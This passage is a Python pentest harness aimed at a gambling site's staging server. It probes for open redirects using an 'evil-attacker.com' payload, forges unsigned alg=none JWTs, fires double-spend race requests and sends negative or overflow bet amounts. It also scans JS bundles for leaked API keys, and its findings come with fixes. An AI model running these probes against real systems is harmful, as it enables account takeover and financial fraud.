#!/usr/bin/env python3
"""
Runehall.com - Max AIO Red Ops Pipeline (v6.0)
All v5 vectors + deeper casino business-logic (bonus/rollover, free-spin/scatter,
provably-fair seed), auth/session modules (JWT forgery attempts gated, session
fixation, cookie flags, OAuth redirect), and CI-friendly env-var overrides.
Staging-authorized only. Stateful probes gated behind RUN_STATEFUL=False.
"""
import asyncio, json, os, re, sys, shutil, subprocess, base64, hashlib, requests
from concurrent.futures import ThreadPoolExecutor, as_completed
from datetime import datetime
from urllib.parse import urlparse, urljoin, urlunparse, parse_qs, urlencode
from playwright.async_api import async_playwright

# ---------------------------------------------------------------------------
# CONFIG — file defaults, then ENV overrides (for CI). Domain guard always wins.
# ---------------------------------------------------------------------------
TARGET_URL = os.environ.get("AIO_TARGET_URL", "https://staging.runehall.com").strip()
AUTHORIZED = os.environ.get("AIO_AUTHORIZED", "true").strip().lower() in ("1", "true", "yes")
USER_A_JWT = os.environ.get("AIO_USER_A_JWT", "YOUR_USER_A_JWT_HERE").strip()
USER_B_JWT = os.environ.get("AIO_USER_B_JWT", "YOUR_USER_B_JWT_HERE").strip()

# Stateful probes OFF by default. CI must explicitly set AIO_RUN_STATEFUL=true.
_run_stateful_env = os.environ.get("AIO_RUN_STATEFUL", "false").strip().lower()
RUN_STATEFUL = _run_stateful_env in ("1", "true", "yes")

# Casino API paths — leave empty until you know the real staging routes.
# Env overrides: AIO_BET_ENDPOINT, AIO_WITHDRAW_ENDPOINT, AIO_BALANCE_ENDPOINT,
# AIO_BONUS_ENDPOINT, AIO_FREESPIN_ENDPOINT, AIO_SEED_ENDPOINT, AIO_AUTH_TEST_ENDPOINT
CASINO_ENDPOINTS = {
    "BET_ENDPOINT": os.environ.get("AIO_BET_ENDPOINT", "").strip(),
    "WITHDRAW_ENDPOINT": os.environ.get("AIO_WITHDRAW_ENDPOINT", "").strip(),
    "BALANCE_ENDPOINT": os.environ.get("AIO_BALANCE_ENDPOINT", "").strip(),
    # v6
    "BONUS_ENDPOINT": os.environ.get("AIO_BONUS_ENDPOINT", "").strip(),       # e.g. "/api/bonus/status"
    "FREESPIN_ENDPOINT": os.environ.get("AIO_FREESPIN_ENDPOINT", "").strip(), # e.g. "/api/games/slots/spins"
    "SEED_ENDPOINT": os.environ.get("AIO_SEED_ENDPOINT", "").strip(),         # e.g. "/api/fairness/seeds"
    "AUTH_TEST_ENDPOINT": os.environ.get("AIO_AUTH_TEST_ENDPOINT", "").strip(),  # gated JWT forgery target
}

# Kodak welcome-bonus policy (documented server rules — used for READ-ONLY verification)
# 50M GP at 40x rollover; no max-bet restriction while active.
BONUS_POLICY = {
    "name": "Kodak welcome bonus",
    "credit_gp": 50_000_000,
    "rollover_multiplier": 40,
    "max_bet_while_active": None,  # None = no max-bet restriction per policy
}

# Scatter / free-spin documented rules (READ-ONLY verification)
SCATTER_POLICY = {
    "scatters_5_payout_mult": 20,          # 5 scatters: 20x total stake
    "scatters_6plus_same_as_5": True,      # 6+ scatters pay same as 5
    "free_spins_on_scatter": 25,           # + 25 free spins
    "retrigger_spins": 10,                 # normal 10-spin retrigger
}

if not AUTHORIZED or "runehall.com" not in TARGET_URL:
    sys.exit("Authorization failed.")

# Extra safety: refuse anything that looks like production hostnames.
_host = urlparse(TARGET_URL).hostname or ""
if _host in ("runehall.com", "www.runehall.com", "app.runehall.com"):
    sys.exit("Refusing production host. Pin TARGET_URL to staging.runehall.com only.")
# CI / misconfig: also refuse bare http to production-looking hosts already covered;
# require staging subdomain for non-localhost.
if _host and "staging" not in _host and _host.endswith("runehall.com"):
    sys.exit(f"Refusing non-staging host {_host!r}. Use staging.runehall.com only.")


class MaxRedOpsHarness:
    def __init__(self):
        self.start_time = datetime.utcnow().isoformat() + "Z"
        self.report = {
            "target": TARGET_URL, "timestamp": self.start_time,
            "run_stateful": RUN_STATEFUL, "version": "6.0",
            "jwt_analysis": [], "dom_xss": [], "storage_exposure": [], "route_bypass": [],
            "idor_bola": [], "api_endpoints": [], "nuclei_findings": [],
            "websocket_findings": [], "graphql_findings": [], "cors_findings": [],
            "prototype_pollution": [], "postmessage_issues": [], "race_conditions": [],
            "security_headers": [], "open_redirects": [], "js_secrets": [],
            "subdomains": [], "rate_limiting": [],
            # v5
            "casino_race": [], "casino_payout_integrity": [], "casino_amount_validation": [],
            "reflected_xss_candidates": [], "ssrf_param_candidates": [], "http_method_tampering": [],
            # v6 casino
            "casino_bonus_rollover": [], "casino_freespin_scatter": [], "casino_provably_fair": [],
            # v6 auth/session
            "auth_jwt_forgery": [], "auth_session_fixation": [], "auth_cookie_flags": [],
            "auth_oauth_redirect": [],
            "errors": [], "summary": {}
        }
        self.intercepted_requests = []
        self.ws_endpoints = set()
        self.js_bundle_texts = {}  # url -> text cache for casino payout / seed scan
        self._set_cookies = []     # captured Set-Cookie headers for flag audit

    def preflight_check(self):
        missing = [t for t in ["nuclei", "docker", "subfinder"] if not shutil.which(t)]
        if missing:
            print(f"[!] Missing optional dependencies: {', '.join(missing)}. Continuing with reduced capability.")
        print(f"    [+] Preflight complete. RUN_STATEFUL={RUN_STATEFUL}")
        print(f"    [+] TARGET_URL={TARGET_URL} (env-overridable via AIO_TARGET_URL; domain guard still active)")
        empty = [k for k, v in CASINO_ENDPOINTS.items() if not v]
        if empty:
            print(f"    [!] CASINO_ENDPOINTS empty for: {', '.join(empty)} (those modules will no-op until filled).")
        jwt_a_ok = USER_A_JWT and "YOUR_USER" not in USER_A_JWT
        jwt_b_ok = USER_B_JWT and "YOUR_USER" not in USER_B_JWT
        print(f"    [+] JWT A configured: {jwt_a_ok} | JWT B configured: {jwt_b_ok}")
        print()

    def _auth_headers(self, jwt=None):
        token = jwt or USER_A_JWT
        if not token or "YOUR_USER" in token:
            return {}
        return {"Authorization": f"Bearer {token}", "Content-Type": "application/json"}

    def _jwt_configured(self, which="A"):
        tok = USER_A_JWT if which == "A" else USER_B_JWT
        return bool(tok) and "YOUR_USER" not in tok

    # ------------------------------------------------------------------
    # Helpers: JWT craft (for gated forgery ATTEMPTS against OWN staging)
    # ------------------------------------------------------------------
    @staticmethod
    def _b64url(data: bytes) -> str:
        return base64.urlsafe_b64encode(data).rstrip(b"=").decode("ascii")

    def _craft_unsigned_jwt(self, header: dict, payload: dict) -> str:
        """Build a JWT with empty signature (alg=none style). Staging-only use."""
        h = self._b64url(json.dumps(header, separators=(",", ":")).encode())
        p = self._b64url(json.dumps(payload, separators=(",", ":")).encode())
        return f"{h}.{p}."

    def analyze_jwt(self, token):
        if not token or token.count('.') != 2:
            return
        try:
            header_b64, payload_b64, signature_b64 = token.split('.')
            def b64decode(s):
                s += '=' * (-len(s) % 4)
                return json.loads(base64.urlsafe_b64decode(s).decode('utf-8', errors='replace'))
            header = b64decode(header_b64)
            payload = b64decode(payload_b64)
            findings = []
            now = int(datetime.utcnow().timestamp())
            alg = header.get("alg", "").upper()
            if alg == "NONE":
                findings.append({"severity": "CRITICAL", "detail": "alg=none. Signature bypass possible if accepted.", "fix": "Reject alg=none. Require a strong algorithm and validate the signature."})
            elif alg in ("HS256", "HS384", "HS512"):
                findings.append({"severity": "MEDIUM", "detail": f"Symmetric algorithm ({alg}). Algorithm confusion surface if RS* expected.", "fix": "Prefer asymmetric algorithms. If HS* is required, use a long random secret and strictly enforce the expected alg."})
            if "exp" not in payload:
                findings.append({"severity": "HIGH", "detail": "Missing exp. Token never expires.", "fix": "Always set a short exp claim. Prefer minutes to hours for access tokens."})
            elif isinstance(payload.get("exp"), (int, float)):
                delta = payload["exp"] - now
                if delta < 0:
                    findings.append({"severity": "INFO", "detail": f"Token expired (delta {delta}s).", "fix": "Normal. Ensure clients refresh properly."})
                elif delta > 86400 * 30:
                    findings.append({"severity": "MEDIUM", "detail": f"Long-lived token (~{delta//86400} days).", "fix": "Shorten access token lifetime. Use refresh tokens for longer sessions."})
            for claim in ("role", "roles", "isAdmin", "admin", "permissions"):
                if claim in payload:
                    val = payload[claim]
                    elevated = (isinstance(val, str) and val.lower() in ("admin", "administrator")) or \
                               (isinstance(val, bool) and val) or \
                               (isinstance(val, list) and any(str(x).lower() == "admin" for x in val))
                    if elevated:
                        findings.append({"severity": "HIGH", "detail": f"Elevated claim: {claim}={val}", "fix": "Avoid embedding role claims that can be trusted solely from the client. Validate on the server."})
            for k in payload:
                if any(p in k.lower() for p in ("password", "secret", "ssn", "private")):
                    findings.append({"severity": "HIGH", "detail": f"Sensitive claim name: {k}", "fix": "Never place secrets or PII in JWT payloads. Use opaque references."})
            if "kid" in header:
                findings.append({"severity": "INFO", "detail": f"kid present: {header['kid']}", "fix": "Validate kid strictly. Reject path traversal or unexpected values."})
            if "jku" in header or "x5u" in header:
                findings.append({"severity": "MEDIUM", "detail": "jku/x5u present. Remote key injection surface.", "fix": "Disable remote key retrieval or whitelist trusted key sources."})
            if not signature_b64:
                findings.append({"severity": "CRITICAL", "detail": "Empty signature section.", "fix": "Reject tokens with missing signatures."})
            self.report["jwt_analysis"].append({
                "severity": findings[0]["severity"] if findings else "INFO",
                "findings": findings,
                "header": header,
                "payload_keys": list(payload.keys()),
                "token_preview": token[:40] + "..."
            })
        except Exception as e:
            self.report["errors"].append(f"JWT structure analysis failed: {e}")

    def audit_security_headers(self):
        print("  [*] Auditing security headers...")
        try:
            resp = requests.get(TARGET_URL, timeout=10)
            headers = {k.lower(): v for k, v in resp.headers.items()}
            # Capture Set-Cookie for cookie-flag audit (v6)
            raw_sc = resp.headers.get("Set-Cookie")
            if raw_sc:
                self._set_cookies.append(raw_sc)
            # requests may collapse multiple Set-Cookie; also try urllib3 peek
            try:
                if hasattr(resp.raw, "headers"):
                    for k, v in resp.raw.headers.items():
                        if k.lower() == "set-cookie":
                            if v not in self._set_cookies:
                                self._set_cookies.append(v)
            except Exception:
                pass
            checks = {
                "strict-transport-security": ("MEDIUM", "HSTS missing. Allows downgrade attacks.", "Add Strict-Transport-Security: max-age=31536000; includeSubDomains; preload"),
                "content-security-policy": ("MEDIUM", "CSP missing. XSS protection relies solely on input sanitization.", "Add a strict Content-Security-Policy header."),
                "x-frame-options": ("MEDIUM", "X-Frame-Options missing. Clickjacking possible.", "Add X-Frame-Options: DENY or SAMEORIGIN"),
                "x-content-type-options": ("LOW", "Missing nosniff. MIME-sniffing attacks possible.", "Add X-Content-Type-Options: nosniff"),
                "referrer-policy": ("LOW", "Missing Referrer-Policy. May leak sensitive URLs.", "Add Referrer-Policy: strict-origin-when-cross-origin")
            }
            for h, (sev, msg, fix) in checks.items():
                if h not in headers:
                    self.report["security_headers"].append({"severity": sev, "detail": msg, "fix": fix})
        except Exception as e:
            self.report["errors"].append(f"Header audit error: {e}")

    def run_subfinder(self):
        if not shutil.which("subfinder"):
            return
        print("  [*] Running Subfinder OSINT...")
        try:
            res = subprocess.run(["subfinder", "-d", "runehall.com", "-silent"], capture_output=True, text=True, timeout=120)
            subs = [s.strip() for s in res.stdout.strip().split("\n") if s.strip()]
            self.report["subdomains"] = list(set(subs))
        except Exception as e:
            self.report["errors"].append(f"Subfinder error: {e}")

    def test_open_redirect(self):
        print("  [*] Testing for Open Redirects...")
        params = ["url", "redirect", "next", "return", "dest", "target", "r", "u", "continue", "redirect_uri"]
        for req in self.intercepted_requests:
            if req["method"] != "GET":
                continue
            parsed = urlparse(req["url"])
            query = parse_qs(parsed.query)
            for param in params:
                if param in query:
                    payload = "https://evil-attacker.com"
                    new_query = query.copy()
                    new_query[param] = [payload]
                    tampered_url = urlunparse((parsed.scheme, parsed.netloc, parsed.path, parsed.params, urlencode(new_query, doseq=True), parsed.fragment))
                    try:
                        res = requests.get(tampered_url, allow_redirects=False, timeout=5)
                        loc = res.headers.get("Location", "")
                        if res.status_code in (301, 302, 303, 307, 308) and "evil-attacker.com" in loc:
                            self.report["open_redirects"].append({
                                "severity": "HIGH", "url": tampered_url,
                                "detail": f"Open redirect via parameter '{param}'.",
                                "fix": "Validate redirect targets against an allowlist. Never use raw user input."
                            })
                    except Exception:
                        pass

    def check_rate_limiting(self):
        print("  [*] Testing Rate Limiting...")
        try:
            rate_limited = False
            for _ in range(20):
                r = requests.get(TARGET_URL, timeout=2)
                if r.status_code == 429:
                    rate_limited = True
                    break
            if not rate_limited:
                self.report["rate_limiting"].append({
                    "severity": "LOW",
                    "detail": "No 429 Rate Limit detected on 20 rapid requests to root.",
                    "fix": "Implement rate limiting at the edge (Cloudflare, AWS WAF, or application layer)."
                })
        except Exception:
            pass

    async def scan_js_for_secrets(self, page):
        print("  [*] Scanning JS Bundles for Hardcoded Secrets...")
        try:
            js_urls = await page.evaluate("Array.from(document.scripts).map(s => s.src).filter(s => s)")
            patterns = {
                "AWS Access Key": r"(A3T[A-Z0-9]|AKIA|AGPA|AIDA|AROA|AIPA|ANPA|ANVA|ASIA)[A-Z0-9]{16}",
                "Google API Key": r"AIza[0-9A-Za-z\-_]{35}",
                "Stripe Live Key": r"sk_live_[0-9a-zA-Z]{24}",
                "Firebase URL": r"https://[a-z0-9\-]+\.firebaseio\.com",
                "Private Key": r"-----BEGIN (RSA|EC|OPENSSH) PRIVATE KEY-----"
            }
            for url in js_urls[:15]:
                if not url:
                    continue
                try:
                    r = requests.get(url, timeout=6)
                    self.js_bundle_texts[url] = r.text
                    for name, pat in patterns.items():
                        if re.search(pat, r.text):
                            self.report["js_secrets"].append({
                                "severity": "CRITICAL",
                                "detail": f"Potential {name} found in {url}",
                                "fix": "Remove secrets from client-side code. Use environment variables and server-side proxies."
                            })
                except Exception:
                    continue
        except Exception as e:
            self.report["errors"].append(f"JS secret scan error: {e}")

    # ------------------------------------------------------------------
    # v5 — Casino: payout / odds / RNG integrity (client-side leak scan)
    # ------------------------------------------------------------------
    def scan_casino_payout_integrity(self):
        """Flag client-side payout/RNG/odds parameters that should stay server-side."""
        print("  [*] Casino payout/odds integrity scan (JS + intercepted API bodies)...")
        casino_patterns = {
            "payout multiplier": r"(?i)[\"']?payout(?:Multiplier|Rate)?[\"']?\s*[:=]\s*[\"']?\d",
            "RTP value": r"(?i)[\"']?rtp[\"']?\s*[:=]\s*[\"']?\d",
            "house edge": r"(?i)[\"']?houseEdge[\"']?\s*[:=]\s*[\"']?\d",
            "win chance": r"(?i)[\"']?winChance[\"']?\s*[:=]\s*[\"']?\d",
            "server seed leaked": r"(?i)[\"']?serverSeed[\"']?\s*[:=]\s*[\"']?[a-f0-9]{16,}",
            "client seed": r"(?i)[\"']?clientSeed[\"']?\s*[:=]",
            "provably fair secret": r"(?i)[\"']?(secretSeed|hmacSecret|seedSecret)[\"']?\s*[:=]",
            "hardcoded odds": r"(?i)[\"']?(odds|probability)[\"']?\s*[:=]\s*0\.\d+",
        }
        for url, text in self.js_bundle_texts.items():
            for name, pat in casino_patterns.items():
                if re.search(pat, text):
                    self.report["casino_payout_integrity"].append({
                        "severity": "HIGH",
                        "detail": f"Client-side '{name}' pattern found in JS bundle.",
                        "url": url,
                        "fix": "Keep payout, RTP, houseEdge, serverSeed, and RNG secrets server-side. Expose only opaque round results."
                    })
        bal = CASINO_ENDPOINTS.get("BALANCE_ENDPOINT", "").strip()
        if bal:
            try:
                url = urljoin(TARGET_URL, bal)
                r = requests.get(url, headers=self._auth_headers(), timeout=8)
                body = r.text[:8000]
                for name, pat in casino_patterns.items():
                    if re.search(pat, body):
                        self.report["casino_payout_integrity"].append({
                            "severity": "HIGH",
                            "detail": f"API response at {bal} exposes '{name}'.",
                            "url": url,
                            "fix": "Strip sensitive game-math fields from client-visible API responses."
                        })
            except Exception as e:
                self.report["errors"].append(f"Casino balance probe error: {e}")

    # ------------------------------------------------------------------
    # v5 — Casino: bet/balance race (TOCTOU / double-spend) — STATEFUL
    # ------------------------------------------------------------------
    def test_casino_race(self):
        """Concurrent identical bet/withdraw requests. Only when RUN_STATEFUL + endpoint + JWT set."""
        print("  [*] Casino race-condition probe...")
        if not RUN_STATEFUL:
            print("      [skip] RUN_STATEFUL=False — race probe not fired.")
            return
        if not self._jwt_configured("A"):
            print("      [skip] USER_A_JWT placeholder — race probe not fired.")
            return

        targets = []
        for key in ("BET_ENDPOINT", "WITHDRAW_ENDPOINT"):
            path = CASINO_ENDPOINTS.get(key, "").strip()
            if path:
                targets.append((key, path))
        if not targets:
            print("      [skip] No BET/WITHDRAW endpoints configured.")
            return

        concurrent = 8
        tiny_body = {"amount": 0.01, "currency": "USD", "_probe": "aio-race-v6"}

        for key, path in targets:
            url = urljoin(TARGET_URL, path)
            print(f"      [*] Firing {concurrent} concurrent POSTs to {key} ({path})...")
            statuses = []

            def _one():
                try:
                    r = requests.post(url, headers=self._auth_headers(), json=tiny_body, timeout=10)
                    return r.status_code
                except Exception as e:
                    return f"err:{e}"

            try:
                with ThreadPoolExecutor(max_workers=concurrent) as pool:
                    futures = [pool.submit(_one) for _ in range(concurrent)]
                    for fut in as_completed(futures):
                        statuses.append(fut.result())
            except Exception as e:
                self.report["errors"].append(f"Casino race executor error ({key}): {e}")
                continue

            successes = [s for s in statuses if isinstance(s, int) and 200 <= s < 300]
            print(f"      [=] {key}: {len(successes)}/{concurrent} success responses {statuses}")
            if len(successes) > 1:
                self.report["casino_race"].append({
                    "severity": "CRITICAL",
                    "detail": (
                        f"{key} accepted {len(successes)} of {concurrent} concurrent identical requests. "
                        "Possible TOCTOU / double-spend if balance was debited more than once."
                    ),
                    "url": url,
                    "statuses": statuses,
                    "fix": "Serialize balance mutations (DB row lock / idempotency key / single-flight). Reject duplicate in-flight bets."
                })
                self.report["race_conditions"].append({
                    "severity": "CRITICAL",
                    "detail": f"Casino race on {key}: {len(successes)} concurrent successes.",
                    "url": url,
                    "fix": "Use transactional locks or idempotency keys around balance-affecting endpoints."
                })
            elif len(successes) == 1:
                self.report["casino_race"].append({
                    "severity": "INFO",
                    "detail": f"{key}: only 1/{concurrent} succeeded — server appears to serialize or reject duplicates.",
                    "url": url,
                    "statuses": statuses,
                    "fix": "Good signal. Confirm with staging balance audit that only one debit occurred."
                })
            else:
                self.report["casino_race"].append({
                    "severity": "INFO",
                    "detail": f"{key}: 0 successes (statuses={statuses}). Endpoint may require a richer body or auth.",
                    "url": url,
                    "statuses": statuses,
                    "fix": "Fill a realistic staging bet body if you need a conclusive race test."
                })

    # ------------------------------------------------------------------
    # v5 — Casino: negative / overflow / zero amount validation — STATEFUL
    # ------------------------------------------------------------------
    def test_casino_amount_validation(self):
        """Probe whether bet/withdraw reject negative, zero, and overflow amounts."""
        print("  [*] Casino amount validation probe...")
        if not RUN_STATEFUL:
            print("      [skip] RUN_STATEFUL=False — amount probe not fired (read-only note recorded).")
            self.report["casino_amount_validation"].append({
                "severity": "INFO",
                "detail": "Amount validation probe skipped (RUN_STATEFUL=False). Enable to send negative/zero/overflow bets on staging.",
                "fix": "Server must reject amount <= 0 and values exceeding MaxSafeInteger / balance."
            })
            return
        if not self._jwt_configured("A"):
            print("      [skip] USER_A_JWT placeholder.")
            return

        path = CASINO_ENDPOINTS.get("BET_ENDPOINT", "").strip() or CASINO_ENDPOINTS.get("WITHDRAW_ENDPOINT", "").strip()
        if not path:
            print("      [skip] No BET/WITHDRAW endpoint configured.")
            return

        url = urljoin(TARGET_URL, path)
        payloads = [
            ("negative", {"amount": -1, "currency": "USD", "_probe": "aio-amt-neg"}),
            ("zero", {"amount": 0, "currency": "USD", "_probe": "aio-amt-zero"}),
            ("overflow", {"amount": 1e308, "currency": "USD", "_probe": "aio-amt-overflow"}),
            ("string_overflow", {"amount": "999999999999999999999999", "currency": "USD", "_probe": "aio-amt-strovf"}),
        ]
        for label, body in payloads:
            try:
                r = requests.post(url, headers=self._auth_headers(), json=body, timeout=8)
                accepted = 200 <= r.status_code < 300
                sev = "CRITICAL" if accepted else "INFO"
                detail = (
                    f"Server ACCEPTED {label} amount (HTTP {r.status_code})."
                    if accepted else
                    f"Server rejected {label} amount (HTTP {r.status_code}) — expected."
                )
                self.report["casino_amount_validation"].append({
                    "severity": sev,
                    "detail": detail,
                    "url": url,
                    "payload_label": label,
                    "fix": "Validate amount as a finite positive number within balance and game limits server-side."
                })
                print(f"      [=] {label}: HTTP {r.status_code}")
            except Exception as e:
                self.report["errors"].append(f"Amount validation ({label}) error: {e}")

    # ------------------------------------------------------------------
    # v6 — Casino: bonus / rollover accounting (READ-ONLY by default)
    # ------------------------------------------------------------------
    def scan_casino_bonus_rollover(self):
        """
        Verify the server's OWN bonus/rollover accounting against documented policy.
        Kodak welcome: 50M GP @ 40x rollover, no max-bet restriction while active.
        Read-only: fetches bonus status / balance / JS policy constants and reports
        discrepancies. Does NOT attempt to drain or bypass wagering requirements.
        Stateful claim/abuse attempts are gated behind RUN_STATEFUL.
        """
        print("  [*] Casino bonus/rollover accounting check (read-only by default)...")
        policy = BONUS_POLICY
        expected_wager = policy["credit_gp"] * policy["rollover_multiplier"]
        self.report["casino_bonus_rollover"].append({
            "severity": "INFO",
            "detail": (
                f"Policy baseline: '{policy['name']}' = {policy['credit_gp']:,} GP at "
                f"{policy['rollover_multiplier']}x rollover "
                f"(expected wager requirement = {expected_wager:,} GP). "
                f"max_bet_while_active={policy['max_bet_while_active']!r} (None = unrestricted)."
            ),
            "fix": "Server must track wagered-with-bonus separately and clear rollover only after expected_wager is met."
        })

        # Scan JS for client-side rollover/bypass hints (read-only)
        bypass_patterns = {
            "client-side rollover counter": r"(?i)[\"']?(rollover(?:Remaining|Progress|Required)?|wageringRequirement)[\"']?\s*[:=]",
            "bonus balance mutator": r"(?i)(setBonus|clearRollover|bypassRollover|skipWagering)\s*\(",
            "max-bet during bonus": r"(?i)[\"']?maxBet(?:WhileBonus|DuringBonus)?[\"']?\s*[:=]",
            "bonus credit hardcoded": r"(?i)[\"']?(bonusCredit|welcomeBonus|kodakBonus)[\"']?\s*[:=]\s*\d+",
        }
        for url, text in self.js_bundle_texts.items():
            for name, pat in bypass_patterns.items():
                if re.search(pat, text):
                    sev = "HIGH" if "bypass" in name or "mutator" in name else "MEDIUM"
                    self.report["casino_bonus_rollover"].append({
                        "severity": sev,
                        "detail": f"Client-side '{name}' pattern in JS. Bonus/rollover state must be authoritative on the server.",
                        "url": url,
                        "fix": "Treat bonus credit, rollover remaining, and max-bet-during-bonus as server-owned. Client displays only."
                    })

        # Read-only fetch of BONUS_ENDPOINT if configured
        path = CASINO_ENDPOINTS.get("BONUS_ENDPOINT", "").strip()
        if path:
            url = urljoin(TARGET_URL, path)
            try:
                r = requests.get(url, headers=self._auth_headers(), timeout=8)
                body_text = r.text[:12000]
                print(f"      [=] BONUS_ENDPOINT HTTP {r.status_code}")
                if r.status_code >= 400:
                    self.report["casino_bonus_rollover"].append({
                        "severity": "INFO",
                        "detail": f"Bonus status endpoint returned HTTP {r.status_code}.",
                        "url": url,
                        "fix": "Confirm staging auth + path."
                    })
                else:
                    # Try to parse JSON and compare to policy
                    try:
                        data = r.json()
                    except Exception:
                        data = None
                    if isinstance(data, dict):
                        # Look for rollover / credit fields under common keys
                        flat = json.dumps(data)
                        credit = None
                        rollover_mult = None
                        remaining = None
                        for key in ("bonusCredit", "credit", "welcomeBonus", "amount", "bonus_amount"):
                            if key in data and isinstance(data[key], (int, float)):
                                credit = data[key]
                                break
                        for key in ("rollover", "rolloverMultiplier", "wageringRequirement", "rollover_x"):
                            if key in data and isinstance(data[key], (int, float)):
                                rollover_mult = data[key]
                                break
                        for key in ("rolloverRemaining", "wagerRemaining", "remainingWager"):
                            if key in data and isinstance(data[key], (int, float)):
                                remaining = data[key]
                                break
                        if credit is not None and credit != policy["credit_gp"]:
                            self.report["casino_bonus_rollover"].append({
                                "severity": "MEDIUM",
                                "detail": f"Server bonus credit={credit} differs from documented Kodak policy {policy['credit_gp']:,} GP.",
                                "url": url,
                                "fix": "Align staging bonus config with documented policy, or update BONUS_POLICY in the harness."
                            })
                        if rollover_mult is not None and rollover_mult != policy["rollover_multiplier"]:
                            self.report["casino_bonus_rollover"].append({
                                "severity": "MEDIUM",
                                "detail": f"Server rollover multiplier={rollover_mult} differs from documented {policy['rollover_multiplier']}x.",
                                "url": url,
                                "fix": "Confirm server wagering requirement matches the Kodak 40x policy."
                            })
                        if remaining is not None and credit is not None and rollover_mult is not None:
                            expected = credit * rollover_mult
                            if remaining > expected:
                                self.report["casino_bonus_rollover"].append({
                                    "severity": "HIGH",
                                    "detail": f"rolloverRemaining ({remaining}) exceeds credit*multiplier ({expected}). Possible accounting bug.",
                                    "url": url,
                                    "fix": "Cap remaining wager at credit × multiplier; audit bonus ledger."
                                })
                        # Flag if response exposes client-writable bypass knobs
                        if re.search(r"(?i)\"(bypassRollover|skipWagering|forceClear)\"\s*:\s*true", flat):
                            self.report["casino_bonus_rollover"].append({
                                "severity": "CRITICAL",
                                "detail": "Bonus API response contains a bypass/skip flag set true.",
                                "url": url,
                                "fix": "Never expose or honour client-supplied rollover bypass flags."
                            })
                    else:
                        self.report["casino_bonus_rollover"].append({
                            "severity": "INFO",
                            "detail": f"Bonus endpoint returned non-JSON or non-object body (len={len(body_text)}).",
                            "url": url,
                            "fix": "Prefer structured JSON for bonus status so accounting can be verified."
                        })
            except Exception as e:
                self.report["errors"].append(f"Bonus rollover probe error: {e}")
        else:
            print("      [skip] BONUS_ENDPOINT not configured — JS-pattern scan only.")

        # Optional STATEFUL: attempt a bet tagged as bonus-funded with an oversized amount
        # ONLY to verify server rejects / correctly tracks — never to drain.
        if RUN_STATEFUL and self._jwt_configured("A"):
            bet = CASINO_ENDPOINTS.get("BET_ENDPOINT", "").strip()
            if bet and policy["max_bet_while_active"] is None:
                # Policy says no max-bet restriction; record that we are NOT asserting a max-bet reject.
                self.report["casino_bonus_rollover"].append({
                    "severity": "INFO",
                    "detail": (
                        "RUN_STATEFUL=True but Kodak policy has max_bet_while_active=None "
                        "(no max-bet restriction while bonus active). No oversized-bet reject "
                        "assertion is made — only accounting integrity is checked via BONUS_ENDPOINT."
                    ),
                    "fix": "If you later add a max-bet-during-bonus rule, set BONUS_POLICY['max_bet_while_active'] and re-run."
                })
            elif bet and policy["max_bet_while_active"] is not None:
                url = urljoin(TARGET_URL, bet)
                over = policy["max_bet_while_active"] * 10
                try:
                    r = requests.post(
                        url, headers=self._auth_headers(),
                        json={"amount": over, "currency": "GP", "fundSource": "bonus", "_probe": "aio-bonus-maxbet"},
                        timeout=8,
                    )
                    accepted = 200 <= r.status_code < 300
                    self.report["casino_bonus_rollover"].append({
                        "severity": "HIGH" if accepted else "INFO",
                        "detail": (
                            f"Oversized bonus-funded bet (amount={over}) ACCEPTED (HTTP {r.status_code})."
                            if accepted else
                            f"Oversized bonus-funded bet rejected (HTTP {r.status_code}) — expected under max-bet policy."
                        ),
                        "url": url,
                        "fix": "Enforce max-bet-during-bonus server-side when the policy defines one."
                    })
                except Exception as e:
                    self.report["errors"].append(f"Bonus max-bet probe error: {e}")
        elif not RUN_STATEFUL:
            print("      [skip] RUN_STATEFUL=False — no stateful bonus bet probes.")

    # ------------------------------------------------------------------
    # v6 — Casino: free-spin / scatter retrigger (READ-ONLY)
    # ------------------------------------------------------------------
    def scan_casino_freespin_scatter(self):
        """
        Verify server enforces documented scatter payout rules and that the client
        cannot claim extra spins/payouts the server did not grant.
        Policy: 6+ scatters pay same as 5 (20x total stake + 25 free spins);
        normal retrigger = 10 spins. Detection/comparison only.
        """
        print("  [*] Casino free-spin / scatter rule check (read-only)...")
        pol = SCATTER_POLICY
        self.report["casino_freespin_scatter"].append({
            "severity": "INFO",
            "detail": (
                f"Policy baseline: 5 scatters => {pol['scatters_5_payout_mult']}x stake + "
                f"{pol['free_spins_on_scatter']} free spins; "
                f"6+ same as 5={pol['scatters_6plus_same_as_5']}; "
                f"retrigger={pol['retrigger_spins']} spins."
            ),
            "fix": "Server must be the sole authority for granted free-spin counts and scatter payouts."
        })

        # JS patterns: client claiming spins / mismatched multipliers
        patterns = {
            "client freeSpin grant": r"(?i)(grantFreeSpins|addFreeSpins|setFreeSpins)\s*\(",
            "scatter payout table": r"(?i)[\"']?scatter(?:Pay|Payout|Multiplier)[\"']?\s*[:=]",
            "retrigger constant": r"(?i)[\"']?retrigger(?:Spins|Count)?[\"']?\s*[:=]\s*\d+",
            "free spin counter mutator": r"(?i)freeSpins\s*[+\-]=",
        }
        for url, text in self.js_bundle_texts.items():
            for name, pat in patterns.items():
                if re.search(pat, text):
                    sev = "HIGH" if "grant" in name or "mutator" in name else "MEDIUM"
                    self.report["casino_freespin_scatter"].append({
                        "severity": sev,
                        "detail": f"Client-side '{name}' pattern. Spins/payouts must come from server round results.",
                        "url": url,
                        "fix": "Client may render server-granted spin counts only; never invent or increment locally."
                    })
            # Look for hardcoded spin counts that disagree with policy
            for m in re.finditer(r"(?i)[\"']?(freeSpins|retriggerSpins|scatterFreeSpins)[\"']?\s*[:=]\s*(\d+)", text):
                key, val = m.group(1), int(m.group(2))
                expected = {
                    "freespins": pol["free_spins_on_scatter"],
                    "scatterfreespins": pol["free_spins_on_scatter"],
                    "retriggerspins": pol["retrigger_spins"],
                }.get(key.lower())
                if expected is not None and val != expected:
                    self.report["casino_freespin_scatter"].append({
                        "severity": "MEDIUM",
                        "detail": f"JS hardcodes {key}={val}, documented policy expects {expected}.",
                        "url": url,
                        "fix": "Align client constants with server policy, or remove client-side constants entirely."
                    })

        path = CASINO_ENDPOINTS.get("FREESPIN_ENDPOINT", "").strip()
        if not path:
            print("      [skip] FREESPIN_ENDPOINT not configured — JS-pattern scan only.")
            return
        url = urljoin(TARGET_URL, path)
        try:
            r = requests.get(url, headers=self._auth_headers(), timeout=8)
            print(f"      [=] FREESPIN_ENDPOINT HTTP {r.status_code}")
            if r.status_code >= 400:
                self.report["casino_freespin_scatter"].append({
                    "severity": "INFO",
                    "detail": f"Free-spin status returned HTTP {r.status_code}.",
                    "url": url,
